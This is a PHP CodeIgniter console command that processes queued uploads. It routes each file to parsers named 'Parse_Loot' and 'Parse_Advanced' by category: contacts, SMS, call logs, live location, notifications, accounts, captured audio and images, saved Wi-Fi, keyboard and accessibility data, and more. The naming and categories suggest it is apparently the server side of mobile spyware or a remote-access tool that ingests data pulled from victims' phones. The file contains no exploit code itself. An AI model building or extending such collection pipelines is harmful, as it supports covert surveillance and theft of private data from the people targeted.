<?php

namespace App\Commands;

use CodeIgniter\CLI\BaseCommand;
use CodeIgniter\CLI\CLI;
use App\Models\Mod_Upload_Queue;
use App\Models\Mod_Parse_Loot;
use App\Models\Mod_Parse_Advanced;
use App\Models\Mod_Uploaded_Files;
use App\Models\Mod_Crypt;

class ProcessUploadQueue extends BaseCommand
{
    protected $group       = 'Queue';
    protected $name        = 'queue:process';
    protected $description = 'Process pending uploads from the upload_queue table.';

    private array $legacyMethodMap = [
        'contacts' => 'get_contacts',
        'logs'     => 'get_logs',
        'calls'    => 'get_logs',
        'sms'      => 'get_sms',
        'apps'     => 'get_apps',
        'files'    => 'get_files',
        'location'       => 'get_location',
        'sim_configs'    => 'parse_sim_configs',
        'sim_config'     => 'parse_sim_configs',
        'live_locations' => 'parse_live_locations',
        'live_location'  => 'parse_live_locations',
    ];

    private array $advancedMethodMap = [
        'device'              => 'parse_device_context',
        'device_context'      => 'parse_device_context',
        'context'             => 'parse_device_context',
        'network'             => 'parse_network_info',
        'network_info'        => 'parse_network_info',
        'accounts'            => 'parse_accounts',
        'calendar'            => 'parse_calendar',
        'app'                 => 'parse_app_usage',
        'app_usage'           => 'parse_app_usage',
        'usage'               => 'parse_app_usage',
        'notifications'       => 'parse_notifications',
        'bluetooth'           => 'parse_bluetooth',
        'sensors'             => 'parse_sensors',
        'sensor'              => 'parse_sensors',
        'deviceinfo'          => 'parse_device_info',
        'device_info'         => 'parse_device_info',
        'security_audit'      => 'parse_security_audit',
        'securityaudit'       => 'parse_security_audit',
        'audio'               => 'parse_captured_media',
        'image'               => 'parse_captured_media',
        'proc_info'           => 'parse_proc_info',
        'processes'           => 'parse_processes',
        'camera_info'         => 'parse_camera_info',
        'battery_stats'       => 'parse_battery_stats',
        'accessibility'       => 'parse_accessibility',
        'input_methods'       => 'parse_input_methods',
        'cell_towers'         => 'parse_cell_towers',
        'display_info'        => 'parse_display_info',
        'storage'             => 'parse_storage',
        'thermal'             => 'parse_thermal',
        'nfc'                 => 'parse_nfc',
        'data_usage'          => 'parse_data_usage',
        'saved_wifi'          => 'parse_saved_wifi',
        'default_apps'        => 'parse_default_apps',
        'alarms'              => 'parse_alarms',
        'hardware_graphics'   => 'parse_hardware_graphics',
        'hardware_network'    => 'parse_hardware_network',
        'app_security'        => 'parse_app_security',
        'network_security'    => 'parse_network_security',
        'telephony_network'   => 'parse_telephony_network',
        'system_locale'       => 'parse_system_locale',
        'misc_software'       => 'parse_misc_software',
        'misc_hardware'       => 'parse_misc_hardware',
        'apps_notifications'  => 'parse_apps_notifications',
    ];

    public function run(array $params)
    {
        // Check if processing a specific queue ID
        if (isset($params[0]) && $params[0] === 'one' && isset($params[1])) {
            $this->processSingleQueueId((int)$params[1]);
            return;
        }

        $limit = (int)($params[0] ?? 5);
        if ($limit < 1) {
            $limit = 5;
        }

        CLI::write(" Checking for pending uploads (limit: {$limit})...", 'yellow');

        $queueModel  = new Mod_Upload_Queue();
        $pending     = $queueModel->getPendingBatch($limit);

        if (empty($pending)) {
            CLI::write(' No pending uploads found.', 'green');
            return;
        }

        CLI::write(' Found ' . count($pending) . ' pending upload(s).', 'yellow');

        $parseLoot    = new Mod_Parse_Loot();
        $parseAdv     = new Mod_Parse_Advanced();
        $uploadedFileModel = new Mod_Uploaded_Files();
        $cryptModel   = new Mod_Crypt();

        $processed = 0;
        $failed    = 0;

        foreach ($pending as $item) {
            $queueId       = (int)$item['id'];
            $filename      = $item['stored_filename'];
            $category      = $item['file_category'];
            $ownerId       = (int)$item['owner_id'];
            $fileRecordId  = $item['file_record_id'] ? (int)$item['file_record_id'] : null;
            $devicePrintId = $item['device_print_id'] ?: $item['device_checksum'];

            CLI::write(" [{$queueId}] Processing: {$filename} (category: {$category})", 'blue');

            $queueModel->markProcessing($queueId);

            try {
                $result = $this->processItem($parseLoot, $parseAdv, $filename, $ownerId, $category, $devicePrintId, $fileRecordId);

                if ($result && $result['success']) {
                    $queueModel->markCompleted($queueId);

                    if ($fileRecordId > 0) {
                        $uploadedFileModel->updateStatus($fileRecordId, 'processed', $result);
                    }

                    CLI::write(" [{$queueId}] Completed successfully.", 'green');
                    $processed++;
                } else {
                    $errorMsg = is_array($result) ? ($result['error'] ?? 'Processing failed') : 'Processing failed';
                    $queueModel->markFailed($queueId, $errorMsg);

                    if ($fileRecordId > 0) {
                        $uploadedFileModel->updateStatus($fileRecordId, 'failed', ['error' => $errorMsg]);
                    }

                    CLI::error(" [{$queueId}] Failed: {$errorMsg}");
                    $failed++;
                }
            } catch (\Throwable $e) {
                $queueModel->markFailed($queueId, $e->getMessage());

                if ($fileRecordId > 0) {
                    $uploadedFileModel->updateStatus($fileRecordId, 'failed', ['error' => $e->getMessage()]);
                }

                CLI::error(" [{$queueId}] Exception: " . $e->getMessage());
                $failed++;
            }
        }

        CLI::write(" Done. Processed: {$processed}, Failed: {$failed}", $failed > 0 ? 'red' : 'green');
    }

    /**
     * Process a single queue ID immediately (used for real-time upload processing).
     */
    private function processSingleQueueId(int $queueId): void
    {
        CLI::write(" Processing single queue ID: {$queueId}", 'blue');

        $queueModel  = new Mod_Upload_Queue();
        $item        = $queueModel->find($queueId);

        if (!$item) {
            CLI::error(" Queue ID {$queueId} not found.");
            return;
        }

        if ($item['status'] !== 'pending') {
            CLI::write(" Queue ID {$queueId} is not pending (status: {$item['status']}), skipping.", 'yellow');
            return;
        }

        $filename      = $item['stored_filename'];
        $category      = $item['file_category'];
        $ownerId       = (int)$item['owner_id'];
        $fileRecordId  = $item['file_record_id'] ? (int)$item['file_record_id'] : null;
        $devicePrintId = $item['device_print_id'] ?: $item['device_checksum'];

        $queueModel->markProcessing($queueId);

        $parseLoot    = new Mod_Parse_Loot();
        $parseAdv     = new Mod_Parse_Advanced();
        $uploadedFileModel = new Mod_Uploaded_Files();
        $cryptModel   = new Mod_Crypt();

        try {
            $result = $this->processItem($parseLoot, $parseAdv, $filename, $ownerId, $category, $devicePrintId, $fileRecordId);

            if ($result && $result['success']) {
                $queueModel->markCompleted($queueId);
                if ($fileRecordId > 0) {
                    $uploadedFileModel->updateStatus($fileRecordId, 'processed', $result);
                }
                CLI::write(" [{$queueId}] Completed successfully.", 'green');
            } else {
                $errorMsg = is_array($result) ? ($result['error'] ?? 'Processing failed') : 'Processing failed';
                $queueModel->markFailed($queueId, $errorMsg);
                if ($fileRecordId > 0) {
                    $uploadedFileModel->updateStatus($fileRecordId, 'failed', ['error' => $errorMsg]);
                }
                CLI::error(" [{$queueId}] Failed: {$errorMsg}");
            }
        } catch (\Throwable $e) {
            $queueModel->markFailed($queueId, $e->getMessage());
            if ($fileRecordId > 0) {
                $uploadedFileModel->updateStatus($fileRecordId, 'failed', ['error' => $e->getMessage()]);
            }
            CLI::error(" [{$queueId}] Exception: " . $e->getMessage());
        }
    }

    private function processItem(
        Mod_Parse_Loot $parseLoot,
        Mod_Parse_Advanced $parseAdv,
        string $filename,
        int $ownerId,
        string $category,
        string $devicePrintId,
        ?int $fileRecordId
    ): array {
        $startTime = microtime(true);

        if (isset($this->legacyMethodMap[$category]) && method_exists($parseLoot, $this->legacyMethodMap[$category])) {
            $method = $this->legacyMethodMap[$category];
            $parsedCountOrBool = $parseLoot->{$method}($filename, $ownerId, $devicePrintId, $fileRecordId);
        } elseif (isset($this->advancedMethodMap[$category])) {
            $method = $this->advancedMethodMap[$category];

            if ($method === 'parse_captured_media') {
                $parsedCountOrBool = $parseAdv->{$method}($filename, $ownerId, $devicePrintId, $fileRecordId, $category);
            } else {
                $parsedCountOrBool = $parseAdv->{$method}($filename, $ownerId, $devicePrintId, $fileRecordId);
            }
        } else {
            return ['success' => false, 'error' => "No handler for category: {$category}"];
        }

        $durationMs = round((microtime(true) - $startTime) * 1000, 2);

        if ($parsedCountOrBool === false) {
            return [
                'success'     => false,
                'error'       => 'Processing failed in parser',
                'duration_ms' => $durationMs,
            ];
        }

        return [
            'success'      => true,
            'record_count' => is_bool($parsedCountOrBool) ? ($parsedCountOrBool ? 1 : 0) : $parsedCountOrBool,
            'duration_ms'  => $durationMs,
        ];
    }
}
